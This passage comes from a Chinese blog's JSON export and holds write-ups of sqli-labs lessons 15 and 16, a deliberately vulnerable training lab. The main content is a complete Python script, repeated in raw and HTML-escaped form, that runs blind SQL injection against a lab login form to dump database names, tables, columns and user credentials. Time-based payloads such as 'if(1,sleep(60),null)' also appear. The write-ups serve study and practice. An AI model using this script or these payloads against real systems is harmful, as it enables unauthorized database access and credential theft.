\"flag.jpg\" not in res.text:\n\t            column_len = j - 1\n\t            break\n\t    column_lenlist.append(column_len)\n\tprint('[+]user列名长度：', column_lenlist)\n\t\n\t#猜解列名\n\tprint(\"猜解列名....\")\n\tfor i in range(column_numlist[3]):\n\t    column_names = ''\n\t    for j in range(1, column_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            uname = \"admin' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))=%d # \" % (\n\t                i, j, k)\n\t            #print(uname)\n\t            data = {'uname': uname, 'passwd': 'admin'}\n\t            res = requests.post(url, data)\n\t            if \"flag.jpg\" in res.text:\n\t                column_names += chr(k)\n\t                print(\"[-]当前列名猜解：\", column_names)\n\t                break\n\t    column_namelist.append(column_names)\n\tprint(\"[+]users列名:\\n\", column_namelist)\n\t\n\t#爆破字段\n\tprint('获取字段：')\n\tfor column in column_namelist[0:]:\n\t    #print(column, '：')\n\t    dump_num = 0\n\t    #爆破各个字段数量\n\t    for i in range(30):\n\t        uname = \"admin' and %d=(select count(%s) from %s.%s) # \" % (i, column, db_name, table_namelist[-1])\n\t        #print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        if \"flag.jpg\" in res.text:\n\t            dump_num = i\n\t            #print(i)\n\t            break\n\t    dump_numlist.append(dump_num)\n\tprint(\"[+]字段数：\\n\", dump_numlist)\n\t\n\tprint('获取字段：')\n\tfor i in range(len(dump_numlist)):\n\t    print(column_namelist[i]+\":\")\n\t    #####字段个数####\n\t    for j in range(dump_numlist[i]):\n\t        dump_len = 0\n\t        dump_name = ''\n\t        ### 字段长度 ####\n\t        for k in range(1, 21):\n\t            uname = \"admin' and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) # \" % (\n\t                column_namelist[i], db_name, table_namelist[-1], j, k)\n\t            data = {'uname': uname, 'passwd': 'admin'}\n\t            res = requests.post(url, data)\n\t            if \"slap.jpg\" in res.text:\n\t                dump_len = k - 1\n\t                break\n\t        #print(dump_len)\n\t        for l in range(1, dump_len + 1):\n\t            for m in range(32, 127):\n\t                uname = \"admin' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d # \"  % (\n\t                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n\t                data = {'uname': uname, 'passwd': 'admin'}\n\t                #print(uname+chr(m))\n\t                res = requests.post(url, data)\n\t                if \"flag.jpg\" in res.text:\n\t                    dump_name += chr(m)\n\t                    break\n\t        print('[+]', dump_name)\n\n\n​\t\n​\t\n​\t\n​\t\n​\t\n​\t\n","source":"_posts/sqli-labs-lession-15-POST单引号布尔型时间盲注.md","raw":"---\ntitle: sqli-labs lession 15 POST单引号布尔型时间盲注\ndate: 2018-09-27 21:11:20\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs lession 15 POST单引号布尔型时间盲注 #\n---\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-15/1.png)\n\n## 注入 ##\n\n尝试各种姿势都不行,应该要用时间盲注了\n\n### 判断类型 ###\n\n`admin' and if(1,sleep(60),null)#`\n\n测试出类型为字符型\n\n![2](/img/sql/Lesson-15/2.png)\n\n### Payload ###\n\n构造好了之后就和Lesson-9一样了。\n\n{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 查看Lesson-9%}\n\n### 脚本 ###\n\n拿之前写的垃圾脚本改一改,跑下。(有空了把脚本改进下。)\n\n\timport requests\n\turl = 'http://10.60.250.66/sqlilabs/Less-15/'\n\tuname = \"\"\n\tdb_name = ''#security'#数据库名\n\tdb_len = 0#8 #当前数据库长度\n\ttable_num = 0 #4#数据库表数目\n\ttable_names = '' #数据表名\n\ttable_lenlist = []#[6, 8, 7, 5] #数据表名长度列表\n\ttable_namelist = []#['emails', 'referers', 'uagents', 'users'] #数据表名列表\n\tcolumn_numlist = []#[2, 3, 4, 3] #数据表列数\n\tcolumn_lenlist = []#[2, 8, 8] #列名长度列表\n\tcolumn_namelist = []#['id', 'username', 'password'] #列名列表\n\tdump_numlist = []#[13, 13, 13] #字段数量列表\n\tdb_payload = ''\n\ti = j = k = l = m = 0\n\t\n\tleft = 97\n\tright = 123\n\tprint(\"获取数据库长度\")\n\tfor i in range(1, 32):\n\t    uname = \"admin'  and length(database())=%d # \" %i\n\t    data = {'uname': uname, 'passwd': 'admin'}\n\t    res = requests.post(url, data)\n\t    if \"flag.jpg\" in res.text:\n\t        print(\"[+]数据库长度为:\" + str(i) + \"位\")\n\t        break\n\tdb_len = i\n\t\n\tprint(\"获取数据库名\")\n\tfor i in range(1, db_len+1):\n\t    for j in range(left, right):\n\t        uname = \"admin' and ('%s' = mid(database(),1,%d)) # \" % (db_name+chr(j), i)\n\t        # print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        # print(res.text)\n\t        if \"flag.jpg\" in res.text:\n\t            db_name += chr(j)\n\t            print(\"[-]当前猜解:\" + db_name)\n\t            break\n\tprint(\"[+]当前数据库:\" + db_name)\n\t\n\t#数据库中表数目\n\tprint(\"获取表数目....\")\n\tfor i in range(1,100):\n\t    uname = \"admin' and %d=(select count(table_name) from information_schema.tables where table_schema='%s') # \" % (i, db_name)\n\t    #print(uname)\n\t    data = {'uname': uname, 'passwd': 'admin'}\n\t    res = requests.post(url, data)\n\t    if \"flag.jpg\" in res.text:\n\t        table_num = i\n\t        break\n\tprint(\"[+]数据库表数目:\", table_num)\n\t\n\t#数据库中表长度\n\tprint(\"获取表名长度....\")\n\tfor i in range(table_num):\n\t    table_len = 0 #表名长度\n\t    #获取数据表长度\n\t    for j in range(1, 21):\n\t        uname = \"admin' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1)) # \" % (db_name, i, j)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        #print(uname)\n\t        res = requests.post(url, data)\n\t        if \"slap.jpg\" in res.text:\n\t            table_len = j - 1\n\t            table_lenlist.append(table_len)\n\t            break\n\tprint('[+]表名长度：', table_lenlist)\n\t\n\t#数据库表名\n\tprint(\"获取表名....\")\n\tfor i in range(table_num):\n\t    # 获取数据表名\n\t    table_names = ''\n\t    for j in range(1, table_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            uname = \"admin' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))=%d # \" % (db_name, i, j, k)\n\t            #print(uname)\n\t            data = {'uname': uname, 'passwd': 'admin'}\n\t            res = requests.post(url, data)\n\t            if \"flag.jpg\" in res.text:\n\t                table_names += chr(k)\n\t                print(\"[-]当前表名猜解：\", table_names)\n\t                break\n\t    table_namelist.append(table_names)\n\tprint(\"[+]表名:\\n\", table_namelist)\n\t\n\t#数据列数\n\tprint(\"获取列数...\")\n\tfor i in range(table_num):\n\t    #print(i)\n\t    column_num = 0\n\t    for j in range(1, 21):\n\t        uname = \"admin' and %d=(select count(column_name) from information_schema.columns where table_name='%s') # \" % (j, table_namelist[i])\n\t        #print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        if \"flag.jpg\" in res.text:\n\t            column_num = j\n\t            #print(\"[+]\"+table_namelist[i]+\"表列数:\"+ str(column_num))\n\t            column_numlist.append(column_num)\n\t            break\n\tprint(\"[+]数据表列数\\n\", column_numlist)\n\t\n\t#猜解列长度\n\tprint(\"获取列名长度....\")\n\tfor i in range(column_numlist[3]):\n\t    column_len = 0 #列名长度\n\t     #获取列长度\n\t    for j in range(1, 21):\n\t        uname = \"admin' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)) # \" % (i, j)\n\t        #print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        if \"flag.jpg\" not in res.text:\n\t            column_len = j - 1\n\t            break\n\t    column_lenlist.append(column_len)\n\tprint('[+]user列名长度：', column_lenlist)\n\t\n\t#猜解列名\n\tprint(\"猜解列名....\")\n\tfor i in range(column_numlist[3]):\n\t    column_names = ''\n\t    for j in range(1, column_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            uname = \"admin' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))=%d # \" % (\n\t                i, j, k)\n\t            #print(uname)\n\t            data = {'uname': uname, 'passwd': 'admin'}\n\t            res = requests.post(url, data)\n\t            if \"flag.jpg\" in res.text:\n\t                column_names += chr(k)\n\t                print(\"[-]当前列名猜解：\", column_names)\n\t                break\n\t    column_namelist.append(column_names)\n\tprint(\"[+]users列名:\\n\", column_namelist)\n\t\n\t#爆破字段\n\tprint('获取字段：')\n\tfor column in column_namelist[0:]:\n\t    #print(column, '：')\n\t    dump_num = 0\n\t    #爆破各个字段数量\n\t    for i in range(30):\n\t        uname = \"admin' and %d=(select count(%s) from %s.%s) # \" % (i, column, db_name, table_namelist[-1])\n\t        #print(uname)\n\t        data = {'uname': uname, 'passwd': 'admin'}\n\t        res = requests.post(url, data)\n\t        if \"flag.jpg\" in res.text:\n\t            dump_num = i\n\t            #print(i)\n\t            break\n\t    dump_numlist.append(dump_num)\n\tprint(\"[+]字段数：\\n\", dump_numlist)\n\t\n\tprint('获取字段：')\n\tfor i in range(len(dump_numlist)):\n\t    print(column_namelist[i]+\":\")\n\t    #####字段个数####\n\t    for j in range(dump_numlist[i]):\n\t        dump_len = 0\n\t        dump_name = ''\n\t        ### 字段长度 ####\n\t        for k in range(1, 21):\n\t            uname = \"admin' and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) # \" % (\n\t                column_namelist[i], db_name, table_namelist[-1], j, k)\n\t            data = {'uname': uname, 'passwd': 'admin'}\n\t            res = requests.post(url, data)\n\t            if \"slap.jpg\" in res.text:\n\t                dump_len = k - 1\n\t                break\n\t        #print(dump_len)\n\t        for l in range(1, dump_len + 1):\n\t            for m in range(32, 127):\n\t                uname = \"admin' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d # \"  % (\n\t                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n\t                data = {'uname': uname, 'passwd': 'admin'}\n\t                #print(uname+chr(m))\n\t                res = requests.post(url, data)\n\t                if \"flag.jpg\" in res.text:\n\t                    dump_name += chr(m)\n\t                    break\n\t        print('[+]', dump_name)\n\n\n​\t\n​\t\n​\t\n​\t\n​\t\n​\t\n","slug":"sqli-labs-lession-15-POST单引号布尔型时间盲注","published":1,"updated":"2019-06-19T17:23:13.385Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istct00234dsbvwf5prkz","content":"<h1 id=\"sqli-labs-lession-15-POST单引号布尔型时间盲注\"><a href=\"#sqli-labs-lession-15-POST单引号布尔型时间盲注\" class=\"headerlink\" title=\"sqli-labs lession 15 POST单引号布尔型时间盲注\"></a>sqli-labs lession 15 POST单引号布尔型时间盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-15/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>尝试各种姿势都不行,应该要用时间盲注了</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>admin&#39; and if(1,sleep(60),null)#</code></p>\n<p>测试出类型为字符型</p>\n<p><img src=\"/img/sql/Lesson-15/2.png\" alt=\"2\"></p>\n<h3 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload\"></a>Payload</h3><p>构造好了之后就和Lesson-9一样了。</p>\n<a href=\"/2018/09/26/sqli-labs-lession-9-GET单引号基于时间盲注/\" title=\"查看Lesson-9\">查看Lesson-9</a>\n\n<h3 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h3><p>拿之前写的垃圾脚本改一改,跑下。(有空了把脚本改进下。)</p>\n<pre><code>import requests\nurl = &apos;http://10.60.250.66/sqlilabs/Less-15/&apos;\nuname = &quot;&quot;\ndb_name = &apos;&apos;#security&apos;#数据库名\ndb_len = 0#8 #当前数据库长度\ntable_num = 0 #4#数据库表数目\ntable_names = &apos;&apos; #数据表名\ntable_lenlist = []#[6, 8, 7, 5] #数据表名长度列表\ntable_namelist = []#[&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;] #数据表名列表\ncolumn_numlist = []#[2, 3, 4, 3] #数据表列数\ncolumn_lenlist = []#[2, 8, 8] #列名长度列表\ncolumn_namelist = []#[&apos;id&apos;, &apos;username&apos;, &apos;password&apos;] #列名列表\ndump_numlist = []#[13, 13, 13] #字段数量列表\ndb_payload = &apos;&apos;\ni = j = k = l = m = 0\n\nleft = 97\nright = 123\nprint(&quot;获取数据库长度&quot;)\nfor i in range(1, 32):\n    uname = &quot;admin&apos;  and length(database())=%d # &quot; %i\n    data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n    res = requests.post(url, data)\n    if &quot;flag.jpg&quot; in res.text:\n        print(&quot;[+]数据库长度为:&quot; + str(i) + &quot;位&quot;)\n        break\ndb_len = i\n\nprint(&quot;获取数据库名&quot;)\nfor i in range(1, db_len+1):\n    for j in range(left, right):\n        uname = &quot;admin&apos; and (&apos;%s&apos; = mid(database(),1,%d)) # &quot; % (db_name+chr(j), i)\n        # print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        # print(res.text)\n        if &quot;flag.jpg&quot; in res.text:\n            db_name += chr(j)\n            print(&quot;[-]当前猜解:&quot; + db_name)\n            break\nprint(&quot;[+]当前数据库:&quot; + db_name)\n\n#数据库中表数目\nprint(&quot;获取表数目....&quot;)\nfor i in range(1,100):\n    uname = &quot;admin&apos; and %d=(select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;) # &quot; % (i, db_name)\n    #print(uname)\n    data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n    res = requests.post(url, data)\n    if &quot;flag.jpg&quot; in res.text:\n        table_num = i\n        break\nprint(&quot;[+]数据库表数目:&quot;, table_num)\n\n#数据库中表长度\nprint(&quot;获取表名长度....&quot;)\nfor i in range(table_num):\n    table_len = 0 #表名长度\n    #获取数据表长度\n    for j in range(1, 21):\n        uname = &quot;admin&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1)) # &quot; % (db_name, i, j)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        #print(uname)\n        res = requests.post(url, data)\n        if &quot;slap.jpg&quot; in res.text:\n            table_len = j - 1\n            table_lenlist.append(table_len)\n            break\nprint(&apos;[+]表名长度：&apos;, table_lenlist)\n\n#数据库表名\nprint(&quot;获取表名....&quot;)\nfor i in range(table_num):\n    # 获取数据表名\n    table_names = &apos;&apos;\n    for j in range(1, table_lenlist[i]+1):\n        for k in range(left, right):\n            uname = &quot;admin&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))=%d # &quot; % (db_name, i, j, k)\n            #print(uname)\n            data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n            res = requests.post(url, data)\n            if &quot;flag.jpg&quot; in res.text:\n                table_names += chr(k)\n                print(&quot;[-]当前表名猜解：&quot;, table_names)\n                break\n    table_namelist.append(table_names)\nprint(&quot;[+]表名:\\n&quot;, table_namelist)\n\n#数据列数\nprint(&quot;获取列数...&quot;)\nfor i in range(table_num):\n    #print(i)\n    column_num = 0\n    for j in range(1, 21):\n        uname = &quot;admin&apos; and %d=(select count(column_name) from information_schema.columns where table_name=&apos;%s&apos;) # &quot; % (j, table_namelist[i])\n        #print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        if &quot;flag.jpg&quot; in res.text:\n            column_num = j\n            #print(&quot;[+]&quot;+table_namelist[i]+&quot;表列数:&quot;+ str(column_num))\n            column_numlist.append(column_num)\n            break\nprint(&quot;[+]数据表列数\\n&quot;, column_numlist)\n\n#猜解列长度\nprint(&quot;获取列名长度....&quot;)\nfor i in range(column_numlist[3]):\n    column_len = 0 #列名长度\n     #获取列长度\n    for j in range(1, 21):\n        uname = &quot;admin&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1)) # &quot; % (i, j)\n        #print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        if &quot;flag.jpg&quot; not in res.text:\n            column_len = j - 1\n            break\n    column_lenlist.append(column_len)\nprint(&apos;[+]user列名长度：&apos;, column_lenlist)\n\n#猜解列名\nprint(&quot;猜解列名....&quot;)\nfor i in range(column_numlist[3]):\n    column_names = &apos;&apos;\n    for j in range(1, column_lenlist[i]+1):\n        for k in range(left, right):\n            uname = &quot;admin&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))=%d # &quot; % (\n                i, j, k)\n            #print(uname)\n            data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n            res = requests.post(url, data)\n            if &quot;flag.jpg&quot; in res.text:\n                column_names += chr(k)\n                print(&quot;[-]当前列名猜解：&quot;, column_names)\n                break\n    column_namelist.append(column_names)\nprint(&quot;[+]users列名:\\n&quot;, column_namelist)\n\n#爆破字段\nprint(&apos;获取字段：&apos;)\nfor column in column_namelist[0:]:\n    #print(column, &apos;：&apos;)\n    dump_num = 0\n    #爆破各个字段数量\n    for i in range(30):\n        uname = &quot;admin&apos; and %d=(select count(%s) from %s.%s) # &quot; % (i, column, db_name, table_namelist[-1])\n        #print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        if &quot;flag.jpg&quot; in res.text:\n            dump_num = i\n            #print(i)\n            break\n    dump_numlist.append(dump_num)\nprint(&quot;[+]字段数：\\n&quot;, dump_numlist)\n\nprint(&apos;获取字段：&apos;)\nfor i in range(len(dump_numlist)):\n    print(column_namelist[i]+&quot;:&quot;)\n    #####字段个数####\n    for j in range(dump_numlist[i]):\n        dump_len = 0\n        dump_name = &apos;&apos;\n        ### 字段长度 ####\n        for k in range(1, 21):\n            uname = &quot;admin&apos; and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) # &quot; % (\n                column_namelist[i], db_name, table_namelist[-1], j, k)\n            data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n            res = requests.post(url, data)\n            if &quot;slap.jpg&quot; in res.text:\n                dump_len = k - 1\n                break\n        #print(dump_len)\n        for l in range(1, dump_len + 1):\n            for m in range(32, 127):\n                uname = &quot;admin&apos; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d # &quot;  % (\n                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n                data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n                #print(uname+chr(m))\n                res = requests.post(url, data)\n                if &quot;flag.jpg&quot; in res.text:\n                    dump_name += chr(m)\n                    break\n        print(&apos;[+]&apos;, dump_name)</code></pre><p>​    \n​<br>​    \n​<br>​    \n​    </p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-15-POST单引号布尔型时间盲注\"><a href=\"#sqli-labs-lession-15-POST单引号布尔型时间盲注\" class=\"headerlink\" title=\"sqli-labs lession 15 POST单引号布尔型时间盲注\"></a>sqli-labs lession 15 POST单引号布尔型时间盲注</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-15/1.png\" alt=\"1\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>尝试各种姿势都不行,应该要用时间盲注了</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>admin&#39; and if(1,sleep(60),null)#</code></p>\n<p>测试出类型为字符型</p>\n<p><img src=\"/img/sql/Lesson-15/2.png\" alt=\"2\"></p>\n<h3 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload\"></a>Payload</h3><p>构造好了之后就和Lesson-9一样了。</p>\n<a href=\"/2018/09/26/sqli-labs-lession-9-GET单引号基于时间盲注/\" title=\"查看Lesson-9\">查看Lesson-9</a>\n\n<h3 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h3><p>拿之前写的垃圾脚本改一改,跑下。(有空了把脚本改进下。)</p>\n<pre><code>import requests\nurl = &apos;http://10.60.250.66/sqlilabs/Less-15/&apos;\nuname = &quot;&quot;\ndb_name = &apos;&apos;#security&apos;#数据库名\ndb_len = 0#8 #当前数据库长度\ntable_num = 0 #4#数据库表数目\ntable_names = &apos;&apos; #数据表名\ntable_lenlist = []#[6, 8, 7, 5] #数据表名长度列表\ntable_namelist = []#[&apos;emails&apos;, &apos;referers&apos;, &apos;uagents&apos;, &apos;users&apos;] #数据表名列表\ncolumn_numlist = []#[2, 3, 4, 3] #数据表列数\ncolumn_lenlist = []#[2, 8, 8] #列名长度列表\ncolumn_namelist = []#[&apos;id&apos;, &apos;username&apos;, &apos;password&apos;] #列名列表\ndump_numlist = []#[13, 13, 13] #字段数量列表\ndb_payload = &apos;&apos;\ni = j = k = l = m = 0\n\nleft = 97\nright = 123\nprint(&quot;获取数据库长度&quot;)\nfor i in range(1, 32):\n    uname = &quot;admin&apos;  and length(database())=%d # &quot; %i\n    data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n    res = requests.post(url, data)\n    if &quot;flag.jpg&quot; in res.text:\n        print(&quot;[+]数据库长度为:&quot; + str(i) + &quot;位&quot;)\n        break\ndb_len = i\n\nprint(&quot;获取数据库名&quot;)\nfor i in range(1, db_len+1):\n    for j in range(left, right):\n        uname = &quot;admin&apos; and (&apos;%s&apos; = mid(database(),1,%d)) # &quot; % (db_name+chr(j), i)\n        # print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        # print(res.text)\n        if &quot;flag.jpg&quot; in res.text:\n            db_name += chr(j)\n            print(&quot;[-]当前猜解:&quot; + db_name)\n            break\nprint(&quot;[+]当前数据库:&quot; + db_name)\n\n#数据库中表数目\nprint(&quot;获取表数目....&quot;)\nfor i in range(1,100):\n    uname = &quot;admin&apos; and %d=(select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;) # &quot; % (i, db_name)\n    #print(uname)\n    data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n    res = requests.post(url, data)\n    if &quot;flag.jpg&quot; in res.text:\n        table_num = i\n        break\nprint(&quot;[+]数据库表数目:&quot;, table_num)\n\n#数据库中表长度\nprint(&quot;获取表名长度....&quot;)\nfor i in range(table_num):\n    table_len = 0 #表名长度\n    #获取数据表长度\n    for j in range(1, 21):\n        uname = &quot;admin&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1)) # &quot; % (db_name, i, j)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        #print(uname)\n        res = requests.post(url, data)\n        if &quot;slap.jpg&quot; in res.text:\n            table_len = j - 1\n            table_lenlist.append(table_len)\n            break\nprint(&apos;[+]表名长度：&apos;, table_lenlist)\n\n#数据库表名\nprint(&quot;获取表名....&quot;)\nfor i in range(table_num):\n    # 获取数据表名\n    table_names = &apos;&apos;\n    for j in range(1, table_lenlist[i]+1):\n        for k in range(left, right):\n            uname = &quot;admin&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %d,1),%d,1))=%d # &quot; % (db_name, i, j, k)\n            #print(uname)\n            data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n            res = requests.post(url, data)\n            if &quot;flag.jpg&quot; in res.text:\n                table_names += chr(k)\n                print(&quot;[-]当前表名猜解：&quot;, table_names)\n                break\n    table_namelist.append(table_names)\nprint(&quot;[+]表名:\\n&quot;, table_namelist)\n\n#数据列数\nprint(&quot;获取列数...&quot;)\nfor i in range(table_num):\n    #print(i)\n    column_num = 0\n    for j in range(1, 21):\n        uname = &quot;admin&apos; and %d=(select count(column_name) from information_schema.columns where table_name=&apos;%s&apos;) # &quot; % (j, table_namelist[i])\n        #print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        if &quot;flag.jpg&quot; in res.text:\n            column_num = j\n            #print(&quot;[+]&quot;+table_namelist[i]+&quot;表列数:&quot;+ str(column_num))\n            column_numlist.append(column_num)\n            break\nprint(&quot;[+]数据表列数\\n&quot;, column_numlist)\n\n#猜解列长度\nprint(&quot;获取列名长度....&quot;)\nfor i in range(column_numlist[3]):\n    column_len = 0 #列名长度\n     #获取列长度\n    for j in range(1, 21):\n        uname = &quot;admin&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1)) # &quot; % (i, j)\n        #print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        if &quot;flag.jpg&quot; not in res.text:\n            column_len = j - 1\n            break\n    column_lenlist.append(column_len)\nprint(&apos;[+]user列名长度：&apos;, column_lenlist)\n\n#猜解列名\nprint(&quot;猜解列名....&quot;)\nfor i in range(column_numlist[3]):\n    column_names = &apos;&apos;\n    for j in range(1, column_lenlist[i]+1):\n        for k in range(left, right):\n            uname = &quot;admin&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))=%d # &quot; % (\n                i, j, k)\n            #print(uname)\n            data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n            res = requests.post(url, data)\n            if &quot;flag.jpg&quot; in res.text:\n                column_names += chr(k)\n                print(&quot;[-]当前列名猜解：&quot;, column_names)\n                break\n    column_namelist.append(column_names)\nprint(&quot;[+]users列名:\\n&quot;, column_namelist)\n\n#爆破字段\nprint(&apos;获取字段：&apos;)\nfor column in column_namelist[0:]:\n    #print(column, &apos;：&apos;)\n    dump_num = 0\n    #爆破各个字段数量\n    for i in range(30):\n        uname = &quot;admin&apos; and %d=(select count(%s) from %s.%s) # &quot; % (i, column, db_name, table_namelist[-1])\n        #print(uname)\n        data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n        res = requests.post(url, data)\n        if &quot;flag.jpg&quot; in res.text:\n            dump_num = i\n            #print(i)\n            break\n    dump_numlist.append(dump_num)\nprint(&quot;[+]字段数：\\n&quot;, dump_numlist)\n\nprint(&apos;获取字段：&apos;)\nfor i in range(len(dump_numlist)):\n    print(column_namelist[i]+&quot;:&quot;)\n    #####字段个数####\n    for j in range(dump_numlist[i]):\n        dump_len = 0\n        dump_name = &apos;&apos;\n        ### 字段长度 ####\n        for k in range(1, 21):\n            uname = &quot;admin&apos; and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) # &quot; % (\n                column_namelist[i], db_name, table_namelist[-1], j, k)\n            data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n            res = requests.post(url, data)\n            if &quot;slap.jpg&quot; in res.text:\n                dump_len = k - 1\n                break\n        #print(dump_len)\n        for l in range(1, dump_len + 1):\n            for m in range(32, 127):\n                uname = &quot;admin&apos; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d # &quot;  % (\n                    column_namelist[i], db_name, table_namelist[-1], j, l, m)\n                data = {&apos;uname&apos;: uname, &apos;passwd&apos;: &apos;admin&apos;}\n                #print(uname+chr(m))\n                res = requests.post(url, data)\n                if &quot;flag.jpg&quot; in res.text:\n                    dump_name += chr(m)\n                    break\n        print(&apos;[+]&apos;, dump_name)</code></pre><p>​    \n​<br>​    \n​<br>​    \n​    </p>\n"},{"title":"sqli-labs-lession 16 POST双引号布尔型时间盲注","date":"2018-09-27T14:15:07.000Z","_content":"# sqli-labs-lession 16 POST双引号布尔型时间盲注 #\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-16/1.png)\n\n## 注入 ##\n\n和lession-15一样是布尔型时间盲注,只是闭合不同\n\n### 判断类型 ###\n\n`admin\") and if(1,sleep(60),null)#`\n\n测试出类型为字符型\n\n![2](/img/sql/Lesson-16/2.png)\n\n\n### 参考 ###\n\n{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 查看Lesson-9%}\n\n","source":"_posts/sqli-labs-lession-16-POST双引号布尔型时间盲注.md","raw":"---\ntitle: sqli-labs-lession 16 POST双引号布尔型时间盲注\ndate: 2018-09-27 22:15:07\ntags: [sqli-labs]\ncategories: sql注入\n---\n# sqli-labs-lession 16 POST双引号布尔型时间盲注 #\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-16/1.png)\n\n## 注入 ##\n\n和lession-15一样是布尔型时间盲注,只是闭合不同\n\n### 判断类型 ###\n\n`admin\") and if(1,sleep(60),null)#`\n\n测试出类型为字符型\n\n![2](/img/sql/Lesson-16/2.png)\n\n\n### 参考 ###\n\n{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 